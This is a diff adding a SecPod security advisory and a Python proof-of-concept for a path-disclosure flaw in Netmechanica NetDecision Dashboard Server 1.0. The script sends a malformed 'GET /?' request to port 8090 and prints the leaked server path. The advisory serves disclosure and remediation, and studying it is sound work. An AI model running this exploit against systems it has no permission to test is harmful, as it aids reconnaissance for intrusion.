@@ -1,0 +1,155 @@
+##############################################################################
+#
+# Title    : Netmechanica NetDecision Dashboard Server Information Disclosure 
+#            Vulnerability
+# Author   : Prabhu S Angadi SecPod Technologies (www.secpod.com)
+# Vendor   : http://www.netmechanica.com
+# Advisory : http://secpod.org/blog/?p=478
+#            http://secpod.org/advisories/SecPod_Netmechanica_NetDecision_Dashboard_Server_Info_Disc_Vuln.txt
+#	     http://secpod.org/exploits/SecPod_Netmechanica_NetDecision_Dashboard_Server_Info_Disc_PoC.py
+# Software : Netmechanica NetDecision Dashboard Server version 1.0
+# Date     : 05/12/2011
+#
+###############################################################################
+
+SecPod ID: 1038     				05/12/2011 Issue Discovered
+						21/02/2012 Vendor Notified
+						22/02/2012 Vendor Acknowledge
+						24/02/2012 Issue Resolved
+
+
+Class: Information Disclosure			Severity: Medium
+
+
+Overview:
+---------
+Netmechanica NetDecision 4.5.1 Dashboard Server version 1.0 is prone to 
+information disclosure vulnerability.
+
+
+Technical Description:
+----------------------
+The vulnerability is caused due to improper validation of malicious HTTP 
+request to Dashboard server appended with '?' character, which discloses the 
+Dashboard server's web script physical path.
+
+
+Impact:
+--------
+Successful exploitation could allow an attacker to cause disclosure of 
+sensitive information.
+
+
+Affected Software:
+------------------
+Netmechanica NetDecision 4.5.1 (full package) containing Dashboard Server 
+version 1.0
+
+
+Tested on:
+-----------
+Netmechanica NetDecision 4.5.1 (full package) containing Dashboard Server 
+version 1.0 on Windows XP SP3 & Win XP2. Older versions might be affected.
+
+
+References:
+-----------
+http://secpod.org/blog/?p=478
+http://www.netmechanica.com/downloads
+http://www.netmechanica.com/news/?news_id=26
+http://www.netmechanica.com/netdecision_dashboard
+
+
+Proof of Concept:
+----------------
+http://secpod.org/exploits/SecPod_Netmechanica_NetDecision_Dashboard_Server_Info_Disc_PoC.py
+
+
+Vendor URL:
+----------------
+http://www.netmechanica.com
+http://www.netmechanica.com/news/?news_id=26
+
+
+Solution:
+----------
+Upgrade to NetDecision 4.6.1
+
+
+Risk Factor:
+-------------
+CVSS Score Report:
+        ACCESS_VECTOR          = NETWORK
+        ACCESS_COMPLEXITY      = LOW
+        AUTHENTICATION         = NOT_REQUIRED
+        CONFIDENTIALITY_IMPACT = PARTIAL
+        INTEGRITY_IMPACT       = NONE
+        AVAILABILITY_IMPACT    = NONE
+        EXPLOITABILITY         = PROOF_OF_CONCEPT
+        REMEDIATION_LEVEL      = UNAVAILABLE
+        REPORT_CONFIDENCE      = CONFIRMED
+        CVSS Base Score        = 5 (AV:N/AC:L/Au:N/C:P/I:N/A:N)
+        Risk factor            = Medium
+
+Credits:
+--------
+Prabhu S Angadi of SecPod Technologies has been credited with the discovery of this
+vulnerability.
+
+
+#!/usr/bin/python
+##############################################################################
+#
+# Title    : Netmechanica NetDecision Dashboard Server Information Disclosure 
+#            Vulnerability
+# Author   : Prabhu S Angadi SecPod Technologies (www.secpod.com)
+# Vendor   : http://www.netmechanica.com
+# Advisory : http://secpod.org/blog/?p=478
+#            http://secpod.org/advisories/SecPod_Netmechanica_NetDecision_Dashboard_Server_Info_Disc_Vuln.txt
+#	     http://secpod.org/exploits/SecPod_Netmechanica_NetDecision_Dashboard_Server_Info_Disc_PoC.py
+# Software : Netmechanica NetDecision Dashboard Server version 1.0
+# Date     : 05/12/2011
+#
+###############################################################################
+
+import socket,sys,time
+
+
+if len(sys.argv) < 2:
+        print "\t[-] Usage: python SecPod_Netmechanica_NetDecision_Dashboard_Server_Info_Disc_PoC.py target_ip"
+        print "\t[-] Example : python SecPod_Netmechanica_NetDecision_Dashboard_Server_Info_Disc_PoC.py 127.0.0.1"
+        print "\t[-] Exiting..."
+        sys.exit(0)
+
+port   = 8090
+target = sys.argv[1]
+
+try:
+    socket.inet_aton(target)
+except socket.error:
+    print "Invalid IP address found ..."
+    sys.exit(1)
+
+try:
+    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    sock.connect((target,port))
+    time.sleep(1)
+except:
+    print "socket() failed"
+    sys.exit(1)
+
+exploit = "GET " + "/?" + "HTTP/1.0 "+ "\r\n\r\n"
+print "HTTP GET request with '?' filename triggers the vulnerability"
+
+data = exploit
+sock.sendto(data, (target, port))
+res = sock.recv(1024)
+sock.close()
+
+if res.find('file: ') != -1 :
+    print "[+] Full Path of the web script directory of DashBoard Server is ....\r\n"
+    print res.split('file: ')[1]
+else:
+    print "[+] Did not get the source path ..."
+
+sys.exit(1)
